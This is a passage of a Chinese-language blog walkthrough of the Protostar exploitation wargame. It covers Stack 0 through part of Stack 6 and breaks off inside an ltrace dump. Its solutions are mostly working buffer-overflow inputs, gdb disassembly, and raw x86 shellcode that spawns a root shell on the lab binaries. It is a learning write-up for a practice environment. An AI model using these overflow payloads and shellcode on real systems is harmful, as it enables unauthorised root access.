<!DOCTYPE html>
<html lang="en">
    <head>
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta http-equiv="content-type" content="text/html; charset=utf-8">

      <!-- Enable responsiveness on mobile devices-->
      <!-- viewport-fit=cover is to support iPhone X rounded corners and notch in landscape-->
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1, viewport-fit=cover">

      <title></title>

      <!-- CSS -->
      <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;css&#x2F;lib&#x2F;font-awesome.min.css">
      <link rel="stylesheet" href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;site.css">
      <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=PT+Sans:400,400italic,700|Abril+Fatface">
      <script type="text/javascript" charset="utf-8" src="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;js&#x2F;sidebar.js"></script>

      
        <link rel="alternate" type="application/atom+xml" title="RSS" href="https://CSUwangj.github.io/atom.xml">
      

      
      
    </head>

    <body>
      
      
        <header name="header">
          <div>
            <div class="logo"><a href="https:&#x2F;&#x2F;CSUwangj.github.io">LuckyDog</a></div>
            <nav class="menu">
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io" class="nav-item-home">
                  Home
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;categories" class="nav-item-categories">
                  Categories
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;tags" class="nav-item-tags">
                  Tags
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;about" class="nav-item-about">
                  About
                </a>
              
                <a href="https:&#x2F;&#x2F;CSUwangj.github.io&#x2F;archives" class="nav-item-archives">
                  Archives
                </a>
              
            </nav>
          </div>
        </header>
      

      <main class="content container" name="main">
        <div class="content-wrapper">
          
  <div class="post">
    <h1 class="post-title">Exploit-Exercise_Protostar全攻略+解析</h1>
    <span class="post-date">2018-07-22</span>
    <p>目前进度：</p>
<ul>
<li>[x] Stack 0</li>
<li>[x] Stack 1</li>
<li>[x] Stack 2</li>
<li>[x] Stack 3</li>
<li>[ ] 小结一：C/C++程序中的栈</li>
<li>[x] Stack 4</li>
<li>[ ] 小结二：EIP能好怎</li>
<li>[x] Stack 5</li>
<li>[ ] 小结三：shellcode</li>
<li>[x] Stack 6</li>
<li>[x] Stack 7</li>
<li>[x] Format 0</li>
<li>[x] Format 1</li>
<li>[x] Format 2</li>
<li>[x] Format 3</li>
<li>[x] Format 4</li>
<li>[ ] 小结四：格式化字符串</li>
<li>[x] Heap 0</li>
<li>[x] Heap 1</li>
<li>[x] Heap 2</li>
<li>[x] Heap 3</li>
<li>[x] Net 0</li>
<li>[x] Net 1</li>
<li>[x] Net 2</li>
<li>[x] Final 0</li>
<li>[x] Final 1</li>
<li>[x] Final 2</li>
</ul>
<!--more-->
<h1 id="stack-0">Stack 0</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*65</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./stack0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have changed the &#39;</span><span style="color:#a3be8c;">modified</span><span style="color:#c0c5ce;">&#39; variable</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="stack-1">Stack 1</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*64+&#39;dcba&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">xargs</span><span style="color:#c0c5ce;"> ./stack1</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">you</span><span style="color:#c0c5ce;"> have correctly got the variable to the right value</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="stack-2">Stack 2</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">GREENIE</span><span style="color:#c0c5ce;">=`</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*64+&#39;\x0a\x0d\x0a\x0d&#39;</span><span style="color:#c0c5ce;">&quot;` ./stack2</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="stack-3">Stack 3</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) disas win</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Dump</span><span style="color:#c0c5ce;"> of assembler code for function win:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048424 </span><span style="color:#c0c5ce;">&lt;win+0&gt;:     push   %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048425 </span><span style="color:#c0c5ce;">&lt;win+1&gt;:     mov    %</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048427 </span><span style="color:#c0c5ce;">&lt;win+3&gt;:     sub    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x18,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x0804842a </span><span style="color:#c0c5ce;">&lt;win+6&gt;:     movl   $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x8048540,(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048431 </span><span style="color:#c0c5ce;">&lt;win+13&gt;:    call   0x8048360 &lt;puts@plt&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048436 </span><span style="color:#c0c5ce;">&lt;win+18&gt;:    leave</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048437 </span><span style="color:#c0c5ce;">&lt;win+19&gt;:    ret</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">End</span><span style="color:#c0c5ce;"> of assembler dump.</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;a&#39;*64+&#39;\x23\x84\x04\x08&#39;</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">./stack3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">calling</span><span style="color:#c0c5ce;"> function pointer, jumping to 0x08048423</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">code</span><span style="color:#c0c5ce;"> flow successfully changed</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="stack-4">Stack 4</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) disas main</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Dump</span><span style="color:#c0c5ce;"> of assembler code for function main:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048408 </span><span style="color:#c0c5ce;">&lt;main+0&gt;:    push   %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048409 </span><span style="color:#c0c5ce;">&lt;main+1&gt;:    mov    %</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x0804840b </span><span style="color:#c0c5ce;">&lt;main+3&gt;:    and    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">xfffffff0,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x0804840e </span><span style="color:#c0c5ce;">&lt;main+6&gt;:    sub    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x50,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048411 </span><span style="color:#c0c5ce;">&lt;main+9&gt;:    lea    0x10(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#bf616a;">,</span><span style="color:#c0c5ce;">%</span><span style="color:#bf616a;">eax</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048415 </span><span style="color:#c0c5ce;">&lt;main+13&gt;:   mov    %</span><span style="color:#bf616a;">eax</span><span style="color:#c0c5ce;">,(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048418 </span><span style="color:#c0c5ce;">&lt;main+16&gt;:   call   0x804830c &lt;gets@plt&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x0804841d </span><span style="color:#c0c5ce;">&lt;main+21&gt;:   leave</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x0804841e </span><span style="color:#c0c5ce;">&lt;main+22&gt;:   ret</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">End</span><span style="color:#c0c5ce;"> of assembler dump.</span><span style="color:#c0c5ce;">
(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) disas win</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Dump</span><span style="color:#c0c5ce;"> of assembler code for function win:</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080483f4 </span><span style="color:#c0c5ce;">&lt;win+0&gt;:     push   %</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080483f5 </span><span style="color:#c0c5ce;">&lt;win+1&gt;:     mov    %</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">,%</span><span style="color:#bf616a;">ebp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080483f7 </span><span style="color:#c0c5ce;">&lt;win+3&gt;:     sub    $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x18,%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x080483fa </span><span style="color:#c0c5ce;">&lt;win+6&gt;:     movl   $</span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">x80484e0,(%</span><span style="color:#bf616a;">esp</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048401 </span><span style="color:#c0c5ce;">&lt;win+13&gt;:    call   0x804832c &lt;puts@plt&gt;</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048406 </span><span style="color:#c0c5ce;">&lt;win+18&gt;:    leave</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x08048407 </span><span style="color:#c0c5ce;">&lt;win+19&gt;:    ret</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">End</span><span style="color:#c0c5ce;"> of assembler dump.</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#96b5b4;">echo </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">s=&#39;a&#39;*64\nfor i in range(0, 26):\n  s += chr(ord(&#39;a&#39;)+i)\nprint s</span><span style="color:#c0c5ce;">&quot; | </span><span style="color:#bf616a;">python</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">### run with this pattern input</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">gdb</span><span style="color:#c0c5ce;">) r &lt; </span><span style="color:#bf616a;">~</span><span style="color:#c0c5ce;">/stack4.txt</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Starting</span><span style="color:#c0c5ce;"> program: /opt/protostar/bin/stack4 &lt; </span><span style="color:#bf616a;">~</span><span style="color:#c0c5ce;">/stack4.txt</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Program</span><span style="color:#c0c5ce;"> received signal SIGSEGV, Segmentation fault.</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">0x706f6e6d</span><span style="color:#c0c5ce;"> in ?? ()</span><span style="color:#bf616a;">#That</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">s what we need</span><span style="color:#a3be8c;">
###</span><span style="color:#a3be8c;">
$ python -c &quot;print </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#bf616a;">a</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">*0x4c+</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#96b5b4;">\x</span><span style="color:#bf616a;">f4</span><span style="color:#96b5b4;">\x</span><span style="color:#bf616a;">83</span><span style="color:#96b5b4;">\x</span><span style="color:#bf616a;">04</span><span style="color:#96b5b4;">\x</span><span style="color:#bf616a;">08</span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">&quot; | ./stack4</span><span style="color:#a3be8c;">
code flow successfully changed</span><span style="color:#a3be8c;">
Segmentation fault</span><span style="color:#a3be8c;">
</span></code></pre><h1 id="stack-5">Stack 5</h1>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print  &#39;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#39;+ (76-37)*&#39;a&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack5</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">whoami</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">python -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\x89\xe5\xdb\xd2\xd9\x75\xf4\x59\x49\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x51\x5a\x56\x54\x58\x33\x30\x56\x58\x34\x41\x50\x30\x41\x33\x48\x48\x30\x41\x30\x30\x41\x42\x41\x41\x42\x54\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x58\x50\x38\x41\x43\x4a\x4a\x49\x41\x41&#39;+(76-68)*&#39;a&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack5</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(76-29)*&#39;\xcc&#39;+&#39;\xa0\xfc\xff\xbf&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack5</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">whoami</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&#39;</span><span style="color:#a3be8c;">print &quot;\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80&quot; + &quot;\xcc&quot;*(76-34) + &quot;\xa0\xfc\xff\xbf&quot;</span><span style="color:#c0c5ce;">&#39;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack5</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Owned!!!</span><span style="color:#c0c5ce;">
</span></code></pre><h1 id="stack-6">Stack 6</h1>
<h2 id="solution-1-duplicated-shellcode">solution 1: Duplicated Shellcode</h2>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;b&#39;*80</span><span style="color:#c0c5ce;">&quot; |</span><span style="color:#bf616a;">./stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb ▒</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">Segmentation</span><span style="color:#c0c5ce;"> fault (core dumped)</span><span style="color:#c0c5ce;">
</span></code></pre>
<p>这时在dump出来的文件里可以发现输入的东西在别处出现了</p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445422307.png" alt="Duplicated Shellcode" /></p>
<p><img src="https://CSUwangj.github.io/exploit-exercise-protostarquan-gong-lue-jie-xi/1532445627447.png" alt="Duplicated Shellcode2" /></p>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print  &#39;\x31\xf6\xf7\xe6\x52\x52\x52\x54\x5b\x53\x5f\xc7\x07\x2f\x62\x69\x6e\xc7\x47\x04\x2f\x2f\x73\x68\x40\x75\x04\xb0\x3b\x0f\x05\x31\xc9\xb0\x0b\xcd\x80&#39;+ (80-37)*&#39;a&#39;+&#39;\x00\xe0\xfd\xb7&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path 1▒▒▒RRRT[S_▒/bin▒G//sh@u▒;</span><span style="color:#bf616a;">1ɰ</span><span style="color:#c0c5ce;">
                                                        </span><span style="color:#bf616a;">̀aaaaaaaaaaaaaaaaaaaaaaaaaaa</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">	=1001(user) </span><span style="color:#bf616a;">gid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) euid=0(root) </span><span style="color:#bf616a;">groups</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">),1001(user)</span><span style="color:#c0c5ce;">
</span></code></pre><pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> (python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;\xb8\x2f\x73\x68\xf0\x25\xff\xff\xff\x0f\x50\xb8\x2f\x62\x69\x6e\x50\x89\xe3\x31\xc0\xb0\x0b\x31\xc9\x31\xd2\xcd\x80&#39;+(80-29)*&#39;\xcc&#39;+&#39;\x00\xe0\xfd\xb7&#39;</span><span style="color:#c0c5ce;">&quot;; </span><span style="color:#bf616a;">cat</span><span style="color:#c0c5ce;">) | </span><span style="color:#bf616a;">./stack6</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;"> path please: got path ▒/sh▒%▒▒▒P▒/binP▒▒1▒</span><span style="color:#c0c5ce;">
                                                </span><span style="color:#bf616a;">1▒1▒̀▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">id</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">uid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">1001</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">user</span><span style="color:#c0c5ce;">) gid=1001(user) </span><span style="color:#bf616a;">euid</span><span style="color:#c0c5ce;">=</span><span style="color:#a3be8c;">0</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">root</span><span style="color:#c0c5ce;">) groups=0(root)</span><span style="color:#bf616a;">,1001</span><span style="color:#c0c5ce;">(user)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span></code></pre><h3 id="xun-gen-jiu-di">寻根究底</h3>
<pre style="background-color:#2b303b;">
<code><span style="color:#bf616a;">$</span><span style="color:#c0c5ce;"> python</span><span style="color:#bf616a;"> -c </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">print &#39;b&#39;*80</span><span style="color:#c0c5ce;">&quot; |</span><span style="color:#bf616a;">ltrace -S</span><span style="color:#c0c5ce;"> ./stack6 | </span><span style="color:#bf616a;">grep</span><span style="color:#c0c5ce;"> b7fd</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_brk</span><span style="color:#c0c5ce;">(NULL)                                         = </span><span style="color:#bf616a;">0x0804a000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(0, 1, 0, 0, 0xb7ffeff4)                   = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(1, 1, 0, 1, 0xb7ffeff4)                   = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fcntl64</span><span style="color:#c0c5ce;">(2, 1, 0, 2, 0xb7ffeff4)                   = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/suid-debug</span><span style="color:#c0c5ce;">&quot;, 00)                     = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.nohwcap</span><span style="color:#c0c5ce;">&quot;, 00)                  = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 8192, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                         = </span><span style="color:#bf616a;">0xb7fe0000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.preload</span><span style="color:#c0c5ce;">&quot;, 04)                  = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.cache</span><span style="color:#c0c5ce;">&quot;, 0, 00)                   = </span><span style="color:#bf616a;">3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(3, 0xbffff6d4, 0xb7ffeff4, 0xb7fff87c, 3) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 13796, 1, 2, 3)                          = </span><span style="color:#bf616a;">0xb7fdc000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_close</span><span style="color:#c0c5ce;">(3)                                          = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_access</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/etc/ld.so.nohwcap</span><span style="color:#c0c5ce;">&quot;, 00)                  = </span><span style="color:#bf616a;">-2</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/lib/libc.so.6</span><span style="color:#c0c5ce;">&quot;, 0, 00)                     = </span><span style="color:#bf616a;">3</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_read</span><span style="color:#c0c5ce;">(3, &quot;</span><span style="color:#a3be8c;">\177ELF\001\001\001</span><span style="color:#c0c5ce;">&quot;, 512)               = </span><span style="color:#bf616a;">512</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_fstat64</span><span style="color:#c0c5ce;">(3, 0xbffff720, 0xb7ffeff4, 0xb7fdf21d, 0x8048268) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 0x144948, 5, 2050, 3)                    = </span><span style="color:#bf616a;">0xb7e97000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7fd5000, 4096, 0)                     = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0xb7fd6000, 12288, 3, 2066, 3)              = </span><span style="color:#bf616a;">0xb7fd6000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0xb7fd9000, 10568, 3, 50,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)               = </span><span style="color:#bf616a;">0xb7fd9000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_close</span><span style="color:#c0c5ce;">(3)                                          = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mmap2</span><span style="color:#c0c5ce;">(0, 4096, 3, 34,</span><span style="color:#bf616a;"> -1</span><span style="color:#c0c5ce;">)                         = </span><span style="color:#bf616a;">0xb7e96000</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_set_thread_area</span><span style="color:#c0c5ce;">(0xbffffbc0, 0xb7ffeff4, 0xb7e966c0, 1, 0) = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7fd6000, 8192, 1)                     = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_mprotect</span><span style="color:#c0c5ce;">(0xb7ffe000, 4096, 1)                     = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
</span><span style="color:#bf616a;">SYS_munmap</span><span style="color:#c0c5ce;">(0xb7fdc000, 13796)                         = </span><span style="color:#bf616a;">0</span><span style="color:#c0c5ce;">
